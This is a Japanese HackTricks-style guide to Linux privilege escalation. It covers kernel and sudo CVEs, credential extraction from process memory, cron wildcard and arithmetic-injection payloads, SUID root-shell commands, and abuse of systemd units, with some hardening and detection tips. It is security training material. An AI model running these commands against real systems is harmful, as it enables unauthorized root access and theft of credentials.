# Linux 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報収集を始めます
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` 変数内のいずれかのフォルダに**書き込み権限がある**場合、一部のライブラリやバイナリを hijack できる可能性があります：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、privilege escalation に利用できる exploit があるか確認します
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱な kernel の一覧と、すでに **compiled exploits** されているものは、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
その他に **compiled exploits** を確認できるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

その web から脆弱な kernel version をすべて抽出するには、次のように実行します:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 内で実行。kernel 2.x の exploit のみチェック)

必ず **kernel version を Google で検索**してください。kernel version が kernel exploit に記載されている可能性があり、その exploit が有効であることを確認できます。

追加の kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に記載されている脆弱なsudo versionsに基づくと:
```bash
searchsploit sudo
```
この grep を使って、sudo のバージョンに脆弱性があるか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルが user controlled directory から使用される場合、権限のないローカルユーザーが sudo の `--chroot` オプションを介して root へ privilege escalation できる可能性があります。

この [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) は、その [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を exploit するものです。exploit を実行する前に、使用している `sudo` のバージョンが vulnerable であり、`chroot` feature をサポートしていることを確認してください。

詳細については、元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

### Sudo の host-based rules bypass（CVE-2025-32462）

1.9.17p1 より前の Sudo（報告されている影響範囲：**1.8.8–1.9.17**）では、`sudo -h <host>` で user-supplied hostname を指定すると、**real hostname** ではなくその hostname を使用して host-based sudoers rules を評価する可能性があります。別のホストに対して sudoers がより広範な privileges を許可している場合、そのホストをローカルで **spoof** できます。

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules（host が現在の hostname でも `ALL` でもないこと）

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可されたホストを spoofing して exploit:
```bash
sudo -h devbox id
sudo -h devbox -i
```
spoofed name の名前解決がブロックされる場合は、`/etc/hosts` に追加するか、DNS lookup を回避するために、ログや config にすでに登場している hostname を使用します。

#### sudo < v1.8.28

@<PRIVATE_PERSON> より
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗しました

この脆弱性がどのように exploit されるかの**例**については、**HTB の smasher2 box**を確認してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

コンテナ内にいる場合は、まず以下の container-security セクションを確認し、その後 runtime 固有の abuse ページに移動します。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

**何がマウントおよびアンマウントされているか**、またそれがどこで、なぜ行われているのかを確認します。何かがアンマウントされている場合は、それをマウントして private info がないか確認してみます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

便利なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか確認**します。これは、kernel exploit を使用する必要がある場合に役立ちます。使用するマシン（または類似したマシン）上でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール状況

**インストールされているパッケージとサービスのバージョン**を確認します。例えば、古い Nagios のバージョンがあり、privilege escalation に悪用できる可能性があります…\
より疑わしいインストール済みソフトウェアについては、手動でバージョンを確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
SSH access to the machine がある場合、**openVAS** を使用して、machine 内にインストールされている古いソフトウェアや脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドは、ほとんど役に立たない大量の情報を表示するため、OpenVAS などのツールを使用して、インストールされているソフトウェアのバージョンに既知の exploit に対する脆弱性がないか確認することを推奨します_

## Processes

**実行中の processes** を確認し、いずれかの process が**本来よりも高い権限**を持っていないか確認します（root によって実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。**privilege escalation** に悪用できる可能性があります。**Linpeas** は、プロセスのコマンドライン内にある `--inspect` パラメータを確認して、これらを検出します。\
また、**プロセスのバイナリに対する権限**も確認してください。誰かのバイナリを上書きできる可能性があります。

### ユーザー間の親子プロセスチェーン

親プロセスとは**異なるユーザー**で実行されている子プロセスが、直ちに悪意のあるものとは限りません。しかし、これは有用な**トリアージシグナル**です。一部の遷移は想定されたものです（`root` がサービスユーザーを起動する、ログインマネージャーがセッションプロセスを作成するなど）。一方で、通常とは異なるチェーンから、ラッパー、デバッグヘルパー、永続化、または弱い実行時の trust boundary が明らかになることがあります。

簡単な確認ポイント:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
意外な chain を見つけた場合は、親の command line と、その動作に影響を与えるすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な arguments）を調査してください。実際の privesc path の中には、child 自体は書き込み可能ではなくても、**parent-controlled config** や helper chain が書き込み可能だったケースが複数あります。

### Deleted executables and deleted-open files

Runtime artifacts は、**削除後も**アクセスできる場合があります。これは privilege escalation と、すでに機密ファイルを open している process から evidence を復元する場合の両方に役立ちます。

deleted executables を確認します：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上の古いバイナリイメージを実行し続けています。これは調査すべき強いシグナルです。理由は次のとおりです。

- 削除された実行ファイルに興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、依然として有用なファイルディスクリプタを公開している可能性がある
- 特権付きの削除済みバイナリは、最近の改ざんや痕跡隠蔽の試みを示している可能性がある

グローバルに削除済みでオープン中のファイルを収集します。
```bash
lsof +L1
```
興味深いディスクリプタを見つけた場合は、直接復元します:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除済みの secret、script、database export、または flag file をまだ開いたままにしている場合に、特に有用です。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用して、process を monitor できます。これは、頻繁に実行される脆弱な process や、特定の要件が満たされたときに実行される process を特定するのに非常に役立ちます。

### Process memory

サーバー上の一部の service は、**credentials を memory 内に clear text で保存**します。\
通常、他の user に属する process の memory を読み取るには **root privileges** が必要です。そのため、これは通常、すでに root であり、さらに credentials を発見したい場合に有用です。\
ただし、**regular user であっても、自分が所有する process の memory は読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在では、ほとんどの machine がデフォルトで **ptrace を許可していない**ため、unprivileged user に属する他の process を dump できません。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは、ptrace の access を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid である限り、すべての process を debug できます。これは ptrace が動作していた古典的な方法です。
> - **kernel.yama.ptrace_scope = 1**: parent process のみ debug できます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、admin のみ ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace で process を trace できません。一度設定すると、再び ptrace を有効にするには reboot が必要です。

#### GDB

FTP service などの memory に access できる場合、その Heap を取得し、内部から credentials を search できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示し**、**各マッピング領域の権限**も表示します。**mem** pseudo file は、**プロセスのメモリそのものを公開します**。**maps** file から、**読み取り可能なメモリ領域**とそのオフセットがわかります。この情報を使用して、**mem file 内の該当位置へ seek し、読み取り可能なすべての領域を**ファイルにダンプします。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` は仮想メモリではなく、システムの**物理**メモリへのアクセスを提供します。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux向けProcDump

ProcDumpは、Windows向けSysinternals suiteのclassicなProcDump toolをLinux向けに再構想したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、以下を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root の要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticator プロセスが実行中であることがわかった場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み出し**、一部の**既知のファイル**からも取得します。正常に動作させるには root 権限が必要です。

| 機能                                             | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali Desktop、Debian Desktop）       | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                          | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Web「Crontab UI」パネル（alseambusher/crontab-ui）が root として実行され、loopback にのみ bind されている場合でも、SSH のローカルポートフォワーディング経由でアクセスし、特権ジョブを作成して権限昇格できます。

典型的なチェーン
- loopback 専用ポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で特定する
- 運用上のアーティファクトから認証情報を見つける:
- `zip -P <password>` を使用するバックアップ/スクリプト
- `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- Tunnel を作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成して直ちに実行（SUID shellを配置）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI を root として実行せず、専用ユーザーと最小限の権限で制限する
- localhost に bind し、さらに firewall/VPN で access を制限する。password を再利用しない
- unit files に secrets を埋め込まず、secret stores または root のみが読み取れる EnvironmentFile を使用する
- on-demand job executions に対する audit/logging を有効にする



scheduled job に脆弱性がないか確認する。root によって実行される script を利用できる可能性がある（wildcard vuln? root が使用する files を変更できるか？ symlinks を使用できるか？ root が使用する directory に特定の files を作成できるか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` が使用されている場合、実際に実行される名前を確認します：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これは false positive を回避します。書き込み可能な periodic directory は、payload のファイル名がローカルの `run-parts` ルールに一致する場合にのみ有用です。

### Cron path

例えば、_/etc/crontab_ 内には PATH があります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー "user" が /home/user に対する書き込み権限を持っていることに注目してください）

この crontab 内で、root ユーザーが path を設定せずにコマンドまたは script を実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを使用する Cron スクリプト（Wildcard Injection）

root によって実行される script の command 内に「**\***」が含まれている場合、これを悪用して予期しないこと（privesc など）を引き起こせます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcard の前に** _**/some/path/\***_ **のようなパスが付いている場合、脆弱ではありません（** _**./\***_ **でさえも同様です）。**

wildcard exploitation のその他の tricks については、次のページを読んでください:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash は、((...))、$((...))、let における arithmetic evaluation の前に、parameter expansion と command substitution を実行します。root の cron/parser が信頼できない log field を読み込み、それを arithmetic context に渡す場合、攻撃者は command substitution $(...) を inject でき、cron の実行時に root として実行されます。

- 動作する理由: Bash では、expansion は次の順序で実行されます: parameter/variable expansion、command substitution、arithmetic expansion、その後に word splitting と pathname expansion。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は、最初に substitute されて command が実行され、その後に残った numeric な `0` が arithmetic に使用されるため、script はエラーなしで継続します。

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に attacker-controlled な text を書き込ませ、numeric に見える field に command substitution を含め、digit で終わるようにします。arithmetic が有効なままになるよう、command が stdout に出力しないようにするか、redirect してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root が実行する cron script を**変更できる場合**、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootが実行するスクリプトが、**完全なアクセス権を持つディレクトリ**を使用している場合、そのフォルダを削除し、**自分が制御するスクリプトを提供する別のフォルダへのシンボリックリンク**を作成すると役立つ可能性があります。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### シンボリックリンクの検証と、より安全なファイル処理

パスを指定してファイルを読み書きする privileged なスクリプトやバイナリをレビューする際は、リンクの処理方法を確認します。

- `stat()` はシンボリックリンクをたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は、最終的なリンク先の解決や、各パス構成要素の権限の確認に役立ちます。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defenders/developers 向けに、symlink tricks に対するより安全なパターンには以下があります。

- `O_EXCL` と `O_CREAT`: path がすでに存在する場合は失敗する（攻撃者が事前に作成した links/files を防ぐ）。
- `openat()`: trusted directory file descriptor を基準に操作する。
- `mkstemp()`: secure permissions で temporary files を atomic に作成する。

### writable payloads を持つ custom-signed cron binaries

Blue teams は、ときどき cron-driven binaries を「sign」するために、custom ELF section を dump し、vendor string を grep してから root として実行します。その binary が group-writable（例: `root:devs 770` が所有する `/opt/AV/periodic-checks/monitor`）で、さらに signing material を leak できる場合、section を forge して cron task を hijack できます。

1. `pspy` を使用して verification flow を取得します。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後に `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してから file を実行していました。
2. leaked key/config（`signing.zip` から取得）を使用して、期待される certificate を再作成します。
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious replacement（例: SUID bash を配置する、SSH key を追加する）を build し、grep が pass するように certificate を `.text_sig` に embed します。
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits を維持したまま scheduled binary を overwrite します。
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron run を待ちます。naive signature check が成功すると、payload が root として実行されます。

### Frequent cron jobs

processes を monitor して、1、2、5 分ごとに execute されている processes を探せます。利用して privilege escalation できる可能性があります。

例えば、**1 分間、0.1 秒ごとに monitor**し、**実行回数の少ない commands 順に sort**して、最も多く実行された commands を削除するには、以下を実行します。
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**こちらも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（起動するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root バックアップ（pg_basebackup）

root-owned の cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー）を実行している場合、**SUID/SGID binary** を配置できます。この binary は、同じ mode bits のまま **root:root** 所有としてバックアップ出力先に再コピーされます。

典型的な discovery flow（低権限の DB user として）:
- `pspy` を使って、毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを呼び出す root cron を見つけます。
- source cluster（例: `/var/lib/postgresql/14/main`）に自分が書き込み可能であり、job の実行後に destination（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` が cluster をコピーする際にファイルモードビットを保持するために機能します。root が実行すると、コピー先のファイルには **root の所有権と、攻撃者が選択した SUID/SGID** が継承されます。権限を保持し、実行可能な場所に書き込む、同様の特権バックアップ/コピー routine には脆弱性があります。

### Invisible cron jobs

**改行文字なしで、comment の後に carriage return を置く**ことで、cronjob を作成できます。この cron job は正常に動作します。例（carriage return 文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種のステルスな侵入を検出するには、制御文字を表示できるツールで cron ファイルを調査します。
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合、サービスが**開始**、**再起動**、または**停止**されたときに**backdoor が実行される**よう、ファイルを**変更できる可能性があります**（マシンが再起動されるまで待つ必要がある場合があります）。\
例えば、**`ExecStart=/tmp/script.sh`** を使って、.service ファイル内に backdoor を作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限がある場合**、それらを backdoor に変更できます。そうすると、サービスが再実行されたときに backdoor が実行されます。

### systemd PATH - 相対パス

以下で **systemd** が使用する PATH を確認できます：
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**できる場合、**権限昇格**できる可能性があります。次のような**サービス設定**ファイルで使用されている**相対パス**を探す必要があります。
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと**同じ名前**の**実行可能ファイル**を作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**backdoor が実行されます**（通常、権限のないユーザーはサービスを start/stop できませんが、`sudo -l` で使用できるか確認してください）。

**`man systemd.service` でサービスについて詳しく学べます。**

## **Timers**

**Timers** は、名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルまたはイベントを制御します。**Timers** は、カレンダー時刻イベントと単調時刻イベントを標準でサポートしており、非同期で実行できるため、cron の代替として使用できます。

次のコマンドですべての timer を列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit のいずれか（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unit について次のように説明されています。

> この timer の期限が切れたときに activate する Unit。引数は Unit 名で、サフィックスに ".timer" は付きません。指定されていない場合、この値は timer unit と同じ名前（サフィックスを除く）の service になります。（上記を参照してください。）activate される Unit 名と timer unit の Unit 名は、サフィックス以外は同じ名前にすることが推奨されます。

したがって、この permission を abuse するには、次のことを行う必要があります。

- **writable な binary を実行している** systemd unit（`.service` など）を探す
- **relative path を実行しており**、その **systemd PATH** に対する **writable privileges** を持つ systemd unit を探す（その executable になりすますため）

**`man systemd.timer` で timer の詳細を確認できます。**

### **Timer の有効化**

timer を有効化するには root privileges が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`**timer**` は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に symlink を作成することで **activated** されることに注意してください。

## Sockets

Unix Domain Sockets (UDS) は、client-server モデル内で同一または異なるマシン上の **process communication** を可能にします。コンピューター間通信には標準の Unix descriptor files を使用し、`.socket` files を通じて設定されます。

Sockets は `.socket` files を使用して設定できます。

**`man systemd.socket` で sockets の詳細を確認できます。** この file 内では、いくつかの興味深い parameters を設定できます。

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらの options はそれぞれ異なりますが、socket が **どこで listen するかを示す**ために summary が使用されます（AF_UNIX socket file の path、listen する IPv4/6 および／または port number など）。
- `Accept`: boolean argument を受け取ります。**true** の場合、**incoming connection ごとに service instance が spawn され**、その instance には connection socket のみが渡されます。**false** の場合、listen している sockets 自体がすべて **started service unit に渡され**、すべての connections に対して service unit は 1 つだけ spawn されます。この value は datagram sockets と FIFOs では無視され、単一の service unit が無条件にすべての incoming traffic を処理します。**デフォルトは false** です。performance 上の理由から、新しい daemons は `Accept=no` に適した方法でのみ記述することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 つ以上の command lines を受け取り、それぞれ listen **sockets**/FIFOs が **作成**され bind される**前**または**後**に **実行されます**。command line の最初の token は absolute filename でなければならず、その後に process の arguments が続きます。
- `ExecStopPre`, `ExecStopPost`: listen **sockets**/FIFOs が **close** され remove される**前**または**後**に **実行される**追加の **commands** です。
- `Service`: **incoming traffic** 時に **activate する** **service** unit name を指定します。この setting は Accept=no の sockets でのみ許可されます。デフォルトでは socket と同じ name を持つ service（suffix を置き換えたもの）になります。ほとんどの場合、この option を使用する必要はありません。

### Writable .socket files

**writable** な `.socket` file を見つけた場合、`[Socket]` section の先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを **追加**できます。すると backdoor は socket が作成される前に実行されます。そのため、**machine が reboot されるまで待つ必要がある可能性があります。**\
_system がその socket file configuration を使用していなければ、backdoor は実行されないことに注意してください_

